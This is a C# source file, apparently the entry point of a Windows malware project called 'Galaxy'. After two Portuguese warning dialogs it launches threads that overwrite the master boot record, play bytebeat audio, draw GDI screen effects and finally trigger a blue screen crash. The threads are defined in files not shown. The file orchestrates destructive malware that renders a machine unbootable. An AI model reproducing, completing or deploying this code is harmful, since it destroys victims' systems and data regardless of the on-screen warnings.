using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using static Vanara.PInvoke.Kernel32;
using System.Windows.Forms;
using System.Threading;
using static Galaxy.GDI;
using static Galaxy.Threads;

namespace Galaxy
{
    public class _Main_
    {

        public static int Main()
        {
            DialogResult message = System.Windows.Forms.MessageBox.Show("Isso é um malware que ira substituir a MBR(Master Boot Record) você que MESMO EXECUTAR", "AVISO",MessageBoxButtons.YesNo,MessageBoxIcon.Warning);
            if (message == DialogResult.Yes)
            {
                DialogResult message2 = System.Windows.Forms.MessageBox.Show("VOCÊ QUER REALMENTE EXECUTAR", "AVISO FINAL", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                if (message2 == DialogResult.Yes)
                {
                    mbr.Start();
                    
                    Sleep(1000 * 5);
                    bytebeat1.Start();
                    gdi1.Start();
                    Sleep(1000 * 20);
                    texts.Start();
                    Sleep(1000 * 20);
                    gdi2.Start();
                    Sleep(1000 * 16);
                    gdi3.Start();
                    Sleep(1000 * 18);
                    bytebeat2.Start();
                    bytebeat1.Abort();
                    gdi1.Abort();
                    gdi4.Start();
                    gdi2.Abort();
                    gdi3.Abort();
                    Sleep(1000 * 20);
                    bytebeat2.Abort();
                    bytebeat3.Start();
                    gdi4.Abort();
                    gdi5.Start();
                    Sleep(1000 * 18);
                    BSOD.Start();
                }
            }
        

            return 0;
        }
    }
}
